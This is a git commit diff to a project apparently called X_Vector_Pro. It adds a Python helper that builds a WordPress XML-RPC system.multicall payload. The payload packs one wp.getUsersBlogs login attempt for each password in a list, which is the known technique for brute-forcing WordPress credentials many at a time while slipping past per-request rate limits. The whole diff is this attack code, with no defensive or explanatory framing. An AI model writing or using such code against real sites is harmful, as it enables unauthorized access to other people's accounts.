078bb76e7bafc6957f6c91943f63209ac88d9319
Dev713 <53387865+erikg713@users.noreply.github.com>
2025-04-12 08:41:29 -0500

    Update xmlrpc_utils.py

--- X_Vector_Pro/utils/xmlrpc_utils.py
+++ X_Vector_Pro/utils/xmlrpc_utils.py
@@ -1,1 +1,12 @@
+def build_multicall_payload(username, passwords):
+    calls = [{
+        "methodName": "wp.getUsersBlogs",
+        "params": [username, pwd]
+    } for pwd in passwords]
 
+    return {
+        "methodCall": {
+            "methodName": "system.multicall",
+            "params": [calls]
+        }
+    }
